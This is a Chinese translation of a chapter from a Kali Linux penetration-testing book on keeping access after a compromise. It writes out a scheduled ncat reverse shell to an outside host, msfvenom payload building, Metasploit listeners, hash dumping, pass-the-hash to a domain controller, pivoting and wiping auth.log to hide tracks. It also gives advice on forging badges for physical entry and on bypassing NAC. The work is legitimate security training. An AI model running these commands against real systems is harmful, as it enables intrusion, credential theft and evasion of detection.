# Kali Linux 2018：Windows 渗透测试（三）

> 原文：[`annas-archive.org/md5/1C1B0B4E8D8902B879D8720071991E31`](https://annas-archive.org/md5/1C1B0B4E8D8902B879D8720071991E31)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第九章：在服务器或桌面上保持访问权限

曾经想过黑客是如何能够进入一个安全网络并在网络中呆上几个月甚至几年而不被发现的吗？好吧，以下是一些留在网络内部的大招。我们不仅将讨论如何维持已经拥有的本地机器的访问权限，还将讨论如何在网络内部使用**Drop Box**，并让它回家。

在本章中，我们将涵盖以下主题：

+   保持访问或 ET 回家

+   使用 Ncat 保持访问

+   Drop Box

+   破解**网络访问控制器**（**NAC**）

+   使用社会工程学工具包创建钓鱼攻击

+   使用后门工厂来规避杀毒软件

# 保持访问或 ET 回家

在黑客世界中，持久连接被称为**回家**。持久性使攻击者能够留下一个连接返回到攻击机器，并对受害机器进行完整的命令行或桌面连接。

为什么要这样做？你的网络通常受到防火墙的保护，对内部机器的端口连接由防火墙控制，而不是由本地机器控制。当然，如果你在一个盒子里，你可以打开 telnet，并且你可以从本地网络访问 telnet 端口。但是你很难从公共网络访问到这个端口。任何本地防火墙都可能阻止这个端口，而网络扫描会显示受害机器上正在运行 telnet。这将警示目标组织的网络安全团队。因此，与其在受损服务器上开放一个端口，不如让你的受害机器呼叫你的攻击机器更安全、更有效。

在本章中，我们将主要使用 HTTPS 反向 shell。之所以这样做是因为你的受损机器可以呼叫攻击机器上的任何端口，但是如果发送到一个不寻常的目的地，比如攻击机器上的端口`4444`，一个良好的 IDS/IPS 系统可能会检测到这种连接。大多数 IDS/IPS 系统将对 HTTPS 端口的出站连接进行白名单处理，因为大多数系统的系统更新都是通过 HTTPS 协议进行的。你的出站连接到攻击机器看起来更像是一个更新而不是一个被黑客攻击的端口。

持久连接确实必须直接返回到攻击者的机器。你可以将这种类型的连接从一个或多个机器上转移，以掩盖你的踪迹。从目标网络内部的一台机器和目标网络外部的一对机器上进行转移，使得防御者更难以看清发生了什么。

是的，你可以将这种类型的攻击从朝鲜或中国的一台机器上转移出来，看起来就像攻击来自那里。每当我们在媒体上听到一个网络攻击来自某个可恶的外国攻击者时，我们都会翻白眼。除非你能够访问攻击机器及其日志，否则无法确定攻击的原始来源。即使有了对攻击机器的访问，你仍然不知道攻击者经过了多少次转移才到达那台机器。你仍然不知道最后一个连接的完整回溯。在这个过程中使用类似 Tor 的东西，没有人能确定这次黑客攻击到底来自哪里。

在这个演示中，我们将进行一次四向枢纽的攻击，横跨世界，穿越四个不同的国家，向您展示这是如何完成的。是的，我们正在真正做这件事！

*绝对不要*攻击我们在本书中将要使用的公共 IP 地址。这些是我们为这个项目租用的服务器。在本书出版时，它们将不再在我们的控制之下。

持久连接的一个问题是它们可能会被发现。一个人永远不能低估偏执的系统管理员的细心眼睛（*为什么服务器 192.168.202.4 已经与中国 IP 地址建立了四天的 HTTP 连接？*）。一个真正的攻击者将使用这种方法来掩盖他的踪迹，以防被抓住并且攻击服务器被检查是否有入侵者的证据。在你退出每台机器后清除日志后，追溯连接几乎是不可能的。持久连接所连接的第一个盒子将被攻击者视为敌对的，他们将在每次连接后删除与这台机器的连接痕迹。

请注意以下图表中受害机器具有内部地址。由于受害机器正在呼叫，我们正在绕过 NAT 和入站防火墙规则的入站保护。受害机器将呼叫新加坡的服务器。攻击者正在与美国的受损机器进行交互，但在登录新加坡的恶意服务器之前，会通过两个跳转进行转向。我们在这里仅使用了四个跳转进行演示，但您可以使用任意数量的跳转。跳数越多，反向跟踪就越混乱。一个优秀的攻击者还将在下一次进入时改变他的路线和入站连接的 IP 地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/715bacf3-aff5-4522-84a3-fd250a55924e.png)

对于我们的第一个跳转，我们将前往阿姆斯特丹`178.62.241.119`！如果我们运行`whois`，我们可以看到这个：

```
whois 178.62.241.119

inetnum:    178.62.128.0 - 178.62.255.255
netname:    DIGITALOCEAN-AMS-5
descr:     DigitalOcean Amsterdam
country:    NL
admin-c:    BU332-RIPE
tech-c:    BU332-RIPE
status:    ASSIGNED PA
mnt-by:    digitalocean
mnt-lower:   digitalocean
mnt-routes:  digitalocean
created:    2014-05-01T16:43:59Z
last-modified: 2014-05-01T16:43:59Z
source:    RIPE # Filtered  
```

黑客提示：

一个优秀的调查员看到这些信息后，可能会传唤 DigitalOcean 以找出在受害者回家时租用该 IP 的人，但同样可能是属于列宁格勒的一位老太太的机器。一个僵尸网络的基础是由一组受损的盒子开发而成。本章描述了一个小型的自制僵尸网络。

我们现在将转向德国的主机，`46.101.191.216`。再次，如果我们运行`whois`命令，我们可以看到这个：

```
whois 46.101.191.216

inetnum:    46.101.128.0 - 46.101.255.255
netname:    EU-DIGITALOCEAN-DE1
descr:     Digital Ocean, Inc.
country:    DE
org:      ORG-DOI2-RIPE
admin-c:    BU332-RIPE
tech-c:    BU332-RIPE
status:    ASSIGNED PA
mnt-by:    digitalocean
mnt-lower:   digitalocean
mnt-routes:  digitalocean
mnt-domains:  digitalocean
created:    2015-06-03T01:15:35Z
last-modified: 2015-06-03T01:15:35Z
source:    RIPE # Filtered  
```

现在转向新加坡的转向主机`128.199.190.69`，并运行`whois`命令：

```
whois 128.199.190.69

inetnum:    128.199.0.0 - 128.199.255.255
netname:    DOPI1
descr:     DigitalOcean Cloud
country:    SG
admin-c:    BU332-RIPE
tech-c:    BU332-RIPE
status:    LEGACY
mnt-by:    digitalocean
mnt-domains:  digitalocean
mnt-routes:  digitalocean
created:    2004-07-20T10:29:14Z
last-modified: 2015-05-05T01:52:51Z
source:    RIPE # Filtered
org:      ORG-DOI2-RIPE  
```

我们现在已经准备好从新加坡发动攻击。我们离目标机器只有几英里，但对于毫无戒心的 IT 系统安全管理员来说，攻击看起来就像是来自半个地球之外。

# 掩盖我们的踪迹

如果我们对这些机器有 root 或 sudo 访问权限，我们可以通过运行以下命令干净地退出。这将删除我们登录的痕迹。由于这是我们的攻击机器，我们将以 root 身份运行。包含 SSH 服务登录信息的文件是`/var/log/auth.log`。如果我们删除它然后创建一个新文件，我们登录的日志现在已经消失：

1.  进入`/var/log`目录：

```
cd /var/log  
```

1.  删除`auth.log`文件：

```
rm auth.log  
```

1.  创建一个新的空文件：

```
touch auth.log  
```

1.  关闭终端会话：

```
exit  
```

现在从服务器退出，你就可以干净地离开了。如果你在退出连接时在每台机器上都这样做，那么你就不会被发现。由于这都是基于文本的，当通过这么多的转向运行命令时，你不会真正注意到任何延迟。此外，所有这些流量都是通过 SSH 加密的，因此没有人可以看到你在做什么或者你要去哪里。

# 使用 Ncat 保持访问

**NetCat**（**Ncat**）是一个鲜为人知但功能强大的工具，旨在与网络端口建立原始套接字连接。它是一个小型工具，设计为从一个可执行文件运行，可以轻松传输到系统，并且还可以重命名为任何名称，以隐藏操作系统中的可执行文件。Ncat 将仅使用用户级访问权限回拨到攻击服务器。Ncat 是一个开源应用程序，由[`www.insecure.org`](https://www.insecure.org)提供，这些人也是维护 Nmap 的同样出色的人。Ncat 及其较老的表亲**nc**都已安装在 Kali 上。Ncat 与 Nmap 的任何安装捆绑在一起。

实际上，如前所述，Ncat 有两个版本。旧版本的可执行文件是`nc`。`nc`也会对任何 TCP/UDP 端口进行原始套接字连接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/2fa89d8d-7a0b-4e55-ac77-1d8eee17a960.png)

Ncat 的一个重要优势是它支持 SSL 加密，而 nc 的所有流量都是明文的。nc 的流量有时会被 IDS/IPS 和其他安全设备捕获。Ncat 的流量可以被加密和隐藏，并且看起来像一个 HTTPS 流。Ncat 还有能力只允许来自某些 IP 地址或 IP 子网的连接。

破坏机器的初始攻击可以是网络攻击，也可以是使用某种社会工程方法，比如携带负载以连接回我们攻击服务器的鱼叉式网络钓鱼邮件。

以下截图显示了一份你会想要拒绝的报价 PDF。这个 PDF 包含相同的*phone home*负载，并旨在在用户没有任何交互或批准的情况下安装恶意软件负载。这个 PDF 是使用一个巧妙的工具创建的，我们将在下一节中看到，*使用社会工程工具包创建一个鱼叉式网络钓鱼攻击*：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/04540190-f411-4a24-89d2-df46b690f59d.png)

一旦初始攻击被破坏，我们希望系统定期回拨。这样的攻击可以设置为保持恒定的连接，每次连接丢失时都会重置连接。它也可以设置为在指定的时间间隔重新连接。我们喜欢设置这些，这样攻击会在某个特定时间回拨，如果攻击机器上没有要连接的端口，那么攻击会保持沉默，直到再次到达那个时间。一个完全持久的连接可能会引起网络安全的注意。

我们现在连接到受害者机器，并向受害者上传 Ncat 的副本。从会话中可以看出，这是一次内部攻击。`ncat.exe`文件位于 Kali 的`/usr/share/ncat-w32/`目录中。连接后，在 Meterpreter 中运行以下命令：

```
upload /usr/share/ncat-w32/ncat.exe C:/windows/ncat.exe  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/4004b209-0f77-40bb-80cb-e3ce44e863da.png)

这将把 Ncat 可执行文件传输到受害者系统。请注意，我们在使用`/`而不是`\`作为目录斜杠。由于您使用的是 Linux，必须使用正斜杠**/**。如果您使用**\**并运行命令，您会发现目录名称会连在一起，文件将无法正确上传。

转到 Windows 7 受害者，我们可以在`Windows`目录中看到该文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/778d4198-086b-4d65-94ac-42d33336a070.png)

# 设置 NetCat 客户端

自 Windows NT 3.14 以来，Windows 一直有一个命令行工具来运行计划任务。这个工具叫做`AT`命令。这个命令与 Linux 或 UNIX 上可用的`cron`命令非常相似。您可以设置时间、日期和运行任何命令行工具或脚本的次数。因此，使用您的 Meterpreter 连接`shell`到系统：

```
shell  
```

您现在在受害者系统中。输入以下命令：

```
AT 5:00PM ncat.exe -nv 128.199.190.69 443 -ssl -e cmd.exe  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/8b165c75-b0db-46fc-8286-c7a655ad0d07.png)

这设置了一个每天下午 5:00 运行的作业。它将使用以下变量运行`ncat.exe`可执行文件。它正在调用攻击服务器`128.199.190.69`的端口`443`。`-ssl`标志告诉连接使用 SSL。`-e cmd.exe`标志告诉可执行文件通过连接运行`cmd.exe`可执行文件。

在下午 5:00 之前，我们使用各种枢纽登录到我们的恶意服务器，并启动`ncat`进入监听模式，等待下午 5:00 到来。

请注意，我们在这里连接到`//rogue3`并运行以下命令：

```
ncat -nvlp 443 -ssl  
```

`-n`标志告诉系统不使用 DNS。`-v`告诉系统使输出详细，这样您可以看到输入和输出。`-l`告诉 Ncat 监听。`-p`告诉 Ncat 在端口`443`上监听，`-ssl`告诉 Ncat 使用 SSL 加密会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/e1b49e7f-fac4-48f5-9702-2df3bcf23a15.png)

我们现在已经连接到我们黑客入侵的 Windows 7 机器，具有完整的管理员访问权限，这个漏洞利用将在每天下午 5:00 准备好使用，而无需对网络进行进一步攻击。

警告！

一个真正的攻击者会将 Ncat 的名称更改为更模糊和难以在您的文件系统中发现的名称。小心您的系统上存在两个`calc.exe`或`notepad.exe`。一个在奇怪的地方很可能是 Ncat 或我们接下来要构建的另一种类型的漏洞利用。

# 使用 Metasploit 打电话回家

好吧，那是老派的方法。现在，让我们使用 Metasploit 的工具来做同样的事情。我们将在`//rogue3`上加载 Metasploit，我们邪恶的服务器，让我们的受害者机器连接到该机器上的 Meterpreter shell。我们将从之前的内部黑客中构建和上传这个漏洞利用。除了`msfconsole`之外，我们还将使用 Metasploit 工具包中的其他工具。Metasploit 配备了一个独立的应用程序来构建自定义漏洞和 shellcode。这个工具叫做`msfvenom`，我们将使用它来构建一个漏洞利用。完全使用`msfvenom`可能是一个完整的章节，超出了本书的范围，所以在这里我们将使用最常见的标志来生成我们的可执行文件来构建一个反向 HTTP 漏洞利用。我们将通过运行以下命令来构建漏洞利用：

```
msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_https -f exe -o svchost13.exe  
```

MSFvenom 是一个强大且可配置的工具。MSFvenom 具有构建自定义漏洞的能力，可以绕过任何防病毒软件。防病毒软件通过查看文件的签名来工作。MSFvenom 具有编码漏洞的能力，使得防病毒软件无法检测到它。这是隐藏漏洞的情况，就像另一个常见的可执行文件，比如记事本 MSFvenom，可以向可执行文件添加 NOP 或空代码，使其大小与原始文件相同。很可怕，不是吗？

以下表格显示了标志的列表：

| 用法： |
| --- |
| `/opt/metasploit/apps/pro/msf3/msfvenom [options] <var=val>` |
| **选项** | **长选项** | **变量** | **注释** |
| `-p` | `--payload` | `<payload>` | 要使用的负载。指定`-`或`stdin`以使用自定义负载 |
| `-l` | `--list` | `[module_type]` | 列出模块类型示例：负载、编码器、NOP、全部 |
| `-n` | `--nopsled` | `<length>` | 在负载上添加一个大小为[length]的 nopsled |
| `-f` | `--format` | `<format>` | 输出格式（使用`--help-formats`列出） |
| `-e` | `--encoder` |  | 要使用的编码器 |
| `-a` | `--arch` | `<architecture>` | 要使用的架构 |
|  | `--platform` | `<platform>` | 负载的平台 |
| `-s` | `--space` | `<length>` | 结果负载的最大大小 |
| `-b` | `--bad-chars` | `<list>` | 要避免的字符列表；示例：`\x00\xff` |
| `-i` | `--iterations` | `<count>` | 编码负载的次数 |
| `-c` | `--add-code` | `<path>` | 指定要包含的额外 win32 shellcode 文件 |
| `-x` | `--template` | `<path>` | 指定要用作模板的自定义可执行文件 |
| `-k` | `--keep` |  | 保留模板行为，并将负载注入为新线程 |
| `-o` | `--options` |  | 列出负载的标准选项 |
| `-h` | `--help` |  | 显示此消息 |
|  | `--help-formats` |  | 列出可用格式 |

以下截图显示了命令的输出。`msfvenom`显示没有使用编码器，并且在构建中没有检查坏字符。对于这个演示，它们是不需要的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/3e1676cc-08b2-4d69-8f8d-0ca3f078f49a.png)

现在，通过运行`ls`命令，我们可以看到我们的文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/d691b71a-d30d-485e-ab9c-9f5c3c102ced.png)

现在我们有东西要上传。就像 Ncat 示例一样，我们将使用我们对系统的内部妥协来上传我们的漏洞利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/88154cef-8391-4a74-b654-6e58255622c3.png)

与 Ncat 一样，我们将进入受害者机器并设置`AT`命令运行`svchost13.exe`：

```
shell
AT 5:25PM c:\windows\svchost.exe
exit  
```

在下午 5:25 之前，登录到恶意服务器`//rogue3`。启动 Metasploit 服务`msfconsole`，设置监听器并接受连接。然后使用以下命令设置常见处理程序模块：

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 128.199.190.69
set LPORT 443
exploit  
```

运行 exploit 后，处理程序将开始监听端口`443`，等待你无助的受害者打电话回家。等待一会儿后，我们看到一个来自`69.131.155.226`的连接。这是我们受害者机器背后防火墙的地址。然后处理程序给我们系统的命令提示符。运行 Meterpreter 命令`sysinfo`，我们可以看到名称和机器信息。从这里，你拥有完全的控制权！

一个真正的攻击者可能设置这个漏洞并且几个月后才回来。唯一的问题迹象将是每天下午 5:25 只有一个连接出去并失败。这只是网络上的一个小问题。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/2b717544-7a22-40d9-ac8d-fdb754939ad5.png)

你可能会兴奋地继续下一个征服，但由于我们在网络防火墙后面的机器上，让我们看看网络的其他部分。通过运行`ipconfig`，我们看到这台机器上有两个网络接口。一个在 10 网络上，地址为`10.100.0.0/24`，另一个在 192.168 网络上，地址为`192.168.202.0`。这两个都是受保护的网络，但重要的是网络不是平面的。你不能在私有范围内的两个不同网络类之间路由数据包。10 网络可以访问互联网，所以它可能是一个 DMZ，上面的机器可能更加强化并且包含的数据价值更少。这可能意味着另一个网络上有一些宝藏。这种枢纽可以连接到任一网络，但让我们在这里攻击后端网络并寻找真正的黄金：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/b67fd131-5de9-47de-a5b6-42efc01d3b90.png)

红色标记的路径是我们将要从持久连接到后端网络攻击域控制器的枢纽路径。

那个时间已经过去，我们在我们的恶意服务器上启动了监听器，受害者机器已经打来电话。我们准备进一步。我们将使用 Meterpreter 命令`autoroute`来进入`192.168.202.0/24`网络。

这一次，当我们设置处理程序时，我们将在运行`exploit`命令时使用`-j`标志将会话发送到后台：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/dbec0765-7d32-470c-842f-e60639c1319b.png)

然后受害者机器打来电话。这告诉我们目标网络中的防火墙没有调整以阻止出站数据流，并且异常行为没有引起他们的**入侵检测系统**（**IDS**）的警报。我们建立了连接：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/038c6f49-36e2-4411-8df5-9456164eac08.png)

我们在受害者机器内部，所以我们可以运行 DOS 命令。如果我们运行`ipconfig`，我们可以看到两个接口及其地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/efb5ee64-fc9b-4a58-93e4-1c2ec6604db6.png)

我们知道，系统管理员经常在他们的网络上重复使用密码，所以让我们从这台机器获取哈希并尝试在 DC 上使用它。将这些哈希保存到文本文件或您的**KeepNote**中。稍后会用到它们。

```
getsystem
hashdump  
```

注意`hashdump`命令还找到并下载了`BO Weaver`的密码提示。提示是`funny`。这可能会让你猜密码更容易。有些人的密码提示几乎就是他们的密码，比如*Raiders Star Qback 1970*。一点点研究就能告诉你四分卫是乔治·布兰达，他当时 43 岁，那是雷德队在 NFL 的第一个赛季。他的球衣号码是 16。你的密码列表需要包括*GeorgeBlanda16*，*Blanda1970*和其他相关的东西：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/9b53d897-6728-46bf-8cd5-d0ef0bd8a3e2.png)

输入以下内容：

```
run autoroute -s 192.168.202.0/24  
```

然后运行以下命令打印路由表：

```
run autoroute -p  
```

我们看到我们有一条通往后端网络的路由：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/faee21d5-13de-4f22-b275-1137be0bdf16.png)

# 在 Metasploit 内部运行端口扫描器

现在你有了一条路线，是时候进行侦察了。为了减少噪音，我们将在 Metasploit 中使用一个简单的端口扫描程序：

1.  通过输入以下命令退出 Meterpreter：

```
background  
```

这使得会话保持运行并处于后台状态。

1.  设置扫描仪如下：

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.202.0/24
set PORTS 139,445,389  
```

我们已将端口`389`设置为查找域控制器。

1.  按以下方式设置活动线程数：

```
set THREADS 20    
```

1.  按以下方式运行扫描仪：

```
run    
```

扫描程序运行，我们看到了一个 Windows 域控制器。这是我们的新目标：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/77fa5d16-fc3c-481e-98ec-8cce27a5ad62.png)

现在我们有了目标和密码哈希，下一步是上传一个漏洞利用。由于我们有登录凭据，我们将使用`psexec`模块连接到域控制器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/6ae67851-4bd6-48f0-bb90-cea423f45265.png)

我们没有使用明文密码，因为我们从 Win7 机器的管理员帐户中捕获了哈希。由于我们有哈希，我们不必暴力破解密码。不同类别的机器的密码可能不同，但在这种情况下，它们是一样的。

传递哈希

在 Metasploit 中，哈希与密码一样有效。这被称为**传递哈希**。传递哈希漏洞至少已经存在了十年，它们使用网络上可用的 Windows 登录会话信息。该漏洞利用**本地安全机构**（**LSA**）信息来获取网络上登录到计算机的用户的 NTLM 哈希列表。用于获取信息的工具，如 Metasploit 框架或传递哈希工具包，获取用户名、域名和 LM 和 NT 哈希。

一旦利用运行，我们就会得到一个 Meterpreter shell，并通过运行`sysinfo`，我们可以看到我们在域控制器中：

```
sysinfo  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/32c79140-c39a-4e26-880f-9bdb40322e4f.png)

如前所述，Windows Active Directory 将密码哈希存储在 SAM 数据库中，因此我们可以使用`hashdump`命令来转储域中的所有哈希值：

```
hashdump  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/9688cb6c-ea24-4620-ad42-3d41bc0c63da.png)

我们现在从没有互联网访问权限的后端网络中妥协了王国的所有关键。如果你注意到`hashdump`中用户名后面的数字，你会发现管理员是用户`500`。许多专家告诉 Windows 网络管理员更改管理员帐户的名称，这样就没有人能够知道哪些用户具有哪些权限。显然，这是行不通的。即使使用用户名`NegligibleNebbish`，只要具有`500`的 UID，就表明这是一个具有管理权限的用户。

如果我们将此会话放在后台并运行会话命令，我们可以看到从`//rogue3`恶意服务器到我们受损系统的两个会话正在运行：

```
background
sessions -l  
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/17112a06-c06a-4d3f-91ce-58b35ad7c583.png)

# 投递盒

投递盒，有时也被称为**跳板盒**，是一个小设备，你可以将其隐藏在你正在瞄准的物理位置内。将设备放入位置有时需要其他技能，比如社会工程，甚至是一点点的闯入，以便将设备放入位置。投递盒也可以是安全顾问公司发送的一个箱子，用于在远程位置对网络进行内部渗透测试。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/becbafe6-9120-49b3-ac03-c4137c157153.png)

菠萝

如今，小型全功能计算机价格便宜且易于配置。市场上还有一些专门设计用于此目的并且可以立即使用的设备。树莓派是一款运行完整 Linux 发行版的小型单板计算机，可以为此工作进行配置。专为此目的设计的两款设备是 Wi-Fi Pineapple 和 Pwnie Express。Wi-Fi Pineapple 是我们的个人最爱。它配备了两个可分别配置的 Wi-Fi 接入点。它的大小只比一包香烟稍大。拥有两个 Wi-Fi 无线电使得这个设备能够连接并从任何网络进行跳板连接。还可以连接 USB CAT5 适配器以连接有线网络。这些设备是全功能的 Linux 系统，可以安装任何 Linux 应用程序。

树莓派是另一个可以用于这个目的的好设备。树莓派是一款小型的单板 ARM 系统，可以运行许多版本的 Linux 操作系统。是的，我们的好朋友 Offensive Security 为树莓派构建了一款 Kali 的版本。将镜像简单复制到微型 SD 卡上，系统就准备好了。他们还在这个镜像中使用了另一个巧妙的技巧，用于秘密行动。树莓派设置可以完全加密，并设置为完全从远程系统启动。通过使用特殊密码删除私人加密密钥，也可以远程使系统变砖或禁用。如何设置这个设备的完整细节可以在本章末尾的链接中找到。

现在，你必须将这个设备偷偷放入网络中。对于有线网络，一个长期受欢迎的入侵方法是友好的电信公司员工的方式。员工的工作证很容易在互联网上找到。制作工作证也是一个简单的过程。在被动足迹阶段，你可以找出谁为你的目标提供电信服务。一旦你有了工作证，你就可以出现在目标地点，携带你的工具包和笔记本电脑，去前台说：“嗨，我是来自电信公司的。”我们收到了一张关于互联网速度变慢的工单。”你会惊讶地发现这种方法多么容易就能进入大门，并直接被带到电话间。一旦进入电话间，你可以隐藏并连接你预先配置的 Drop Box。当它启动时，它会自动连接到家里，你就进入了！记住，安全的最薄弱环节始终是人的接口。

对于一种不那么侵入性的方法，如果你的目标办公室有 Wi-Fi，你可以将其用作攻击向量。这就是两个 Wi-Fi 无线电的用武之地。一个可以用来攻击和连接到目标网络，另一个可以用作你的跳板连接。Pineapple 设计为由 USB 电池包供电，就像你用来给手机充电的那种。根据电池大小，Pineapple 可以在断电之前运行长达 72 小时甚至更长时间。通过这种安排，你的恶意软件甚至可以轻松地隐藏在灌木丛中，无需交流电源即可运行。如果在你的攻击期间无法在现场，也无法与恶意服务器联系，捕获的数据也可以复制到设备上的闪存卡上。

在对位置进行物理侦察时，寻找建筑物外部的电缆。有时在某个地点进行扩建时，负责布线的人员会在建筑物外部布线，以便更容易进行安装，但这也为攻击留下了一个漏洞。通过一个良好的藏身之处，几个 RJ45 连接器和一个廉价的交换机，你就可以接入有线网络。

# 破解网络访问控制器（NAC）

如今，NAC 设备在网络上变得越来越普遍。NAC 确实提供了更高级别的安全性，但它们并不是它们的供应商营销和销售材料所暗示的“终极解决方案”。我们将向您展示一种简单的绕过公司网络上 NAC 控制的方法。

以下信息来自我们一段时间前对一家真实公司进行的真实黑客攻击。当然，所有的名称和 IP 地址都已更改以保护公司。这不是理论。这是真实世界的黑客攻击。对于这个戏剧化的公司来说，好消息是我们是好人。令人沮丧的是，我们只用了大约 30 分钟来弄清楚这一点，也许花了 2 个小时来完全实施。

我们将绕过公司的 NAC，https://www.widgetmakers.com。Widget Makers 公司有两个网络：一个是企业局域网（CorpNET），另一个是包含机密数据的生产网络（ProdNET）。这两个网络都是扁平设计，两个网络都可以互相完全访问。在 CorpNET 上配置并安装了一个 NAC 设备。员工现在必须在他们的机器上使用 NAC 代理才能连接到 CorpNET。Widget Makers 使用 SIP 电话进行语音通信。这些电话不在一个单独的 VLAN 上。它们连接到 CorpNET VLAN 以方便使用。Widget Makers 还在 CorpNET 上有许多网络打印机。

NAC 设备使用安装在用户机器上的代理进行用户登录和验证用户和机器的身份。这些设备可以配置为使用**远程身份验证拨号用户系统**（**RADIUS**）服务器或域控制器进行用户凭据的验证。有时，NAC 设备使用证书对机器进行身份验证。试图伪造内部机器的 MAC 地址而没有代理和登录通常会导致 MAC 地址被锁定在网络之外。

系统的弱点在于代理。大多数 NAC 系统都是专有的，与一个供应商绑定。一个供应商的代理将无法与另一个供应商的代理一起使用，而且没有 NAC 控制的标准。大多数供应商只制作运行在 Windows 上的代理，所以如果你的网络上有 Mac 或 Linux 工作站，这些设备无法使用 NAC 控制加入网络。现在供应商会告诉你只能运行 Windows 网络。如果你是一名系统管理员，你知道在现实中根本就没有这样的事情。即使所有工作站和服务器都在任何网络上运行 Windows，还有其他设备要么不运行 Windows，要么无法运行 Windows。

那么，对于不运行 Windows 操作系统的电话、打印机和工作站，你该如何让它们在 NAC 控制范围内工作？你必须在 NAC 设置中将它们的 MAC 和 IP 地址列入白名单。因此，通过将这些设备之一从网络中移除并伪装其身份，你现在可以访问受限 VLAN，并具有你伪装设备的访问级别。在扁平网络中，通常你可以访问所有本地网络中的所有内容。

这种黑客攻击最容易的目标之一是 SIP 电话。如果打印机离线，人们肯定会注意到。每个人都使用打印机。要利用打印机进行这种利用，你必须选择一个不经常使用的打印机。电话是另一回事。办公室总是有额外的电话供客人使用，而且通常情况下，如果你知道员工的工作时间表，你可以选择一个度假的人的电话。拔掉他们的电话，把你的 Drop Box 贴在桌子下面，然后连接到电话插座，你就进入了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/375f89d6-1116-4bed-b615-df5524e59717.png)

那么你该如何保护自己呢？

首先，不要指望 NAC 成为网络上的终极安全功能。NAC 应该只是网络安全架构中的一个层面。实际上，它应该是网络安全的一个较高层面。一个简单的解决方法是关闭（拔掉）未使用的网络端口。这不会阻止黑客篡改度假的人的桌面电话，但可以防止一个空的工作区成为黑客的总部。

任何网络安全的第一层应该是适当的分割。如果不能路由到它，就无法到达它。请注意在前图中**CorpNET**和**ProdNET**可以完全访问彼此。通过**CorpNET**进入的攻击者，伪造网络设备，可以访问受限的**ProdNET**。

# 使用社会工程工具包创建鱼叉式网络钓鱼攻击

**社会工程工具包**（**SET**）许可协议规定，SET 纯粹是为了善良而设计的。未经网络和设备所有者授权的恶意目的使用此工具违反了此工具集的**服务条款**（**TOS**）和许可证。要找到此工具，通过菜单 Kali Linux 08-渗透测试工具 | 社会工程工具包，或在命令行中键入`setoolkit`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/a4c42417-c224-4786-bd86-26828aab53a9.png)

这次攻击将使用 Metasploit 反向 HTTP 有效载荷，因此在使用 SET 之前，您必须执行一些步骤：

1.  启动 Metasploit 服务。通过菜单启动 Metasploit 控制台：应用程序 | 08-渗透测试工具 | Metasploit 框架。您还可以通过在命令提示符中键入`msfconsole`来启动 Metasploit 框架控制台，完全避免使用 GUI 菜单。

1.  确定本地主机地址，您的侦听器将在该地址上侦听，以便您的恶意软件有东西可以回家。在我们的测试网络中，Kali 服务器正在运行在物理主机上的虚拟机上。当恶意软件呼叫时，主机的 IP 或虚拟机的桥接伪以太网卡必须是目的地。如果您在互联网上从 VMS 机器上运行 Kali，这将稍微困难一些。

1.  以下是测试网络的配置。有两台具有互联网访问权限的机器，以及两台只能从内部网络访问的服务器。Kali 186 是攻击者的笔记本电脑，而 Windows 10 工作站是内部网络的跳板。

1.  一旦您启动了 Metasploit，您需要启动侦听器，这样您即将创建的恶意软件在回家时有东西可以回答。

1.  在 MSF 命令提示符中输入以下命令：

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.0.0.2
set LPORT 4343 exploit  
```

1.  侦听器是一个正在运行的开放进程，因此光标不会返回到就绪状态。为了显示侦听器是活动的，我们可以使用`nmap`对其进行端口扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/21521e32-60f1-4665-83d5-deccdcb5c9ac.png)

另一方面，侦听器已经对`nmap`扫描做出了响应，并输出了扫描数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-win-pentest/img/f0ff3f00-86bb-4235-a0d8-f2aaf3f0a7da.png)

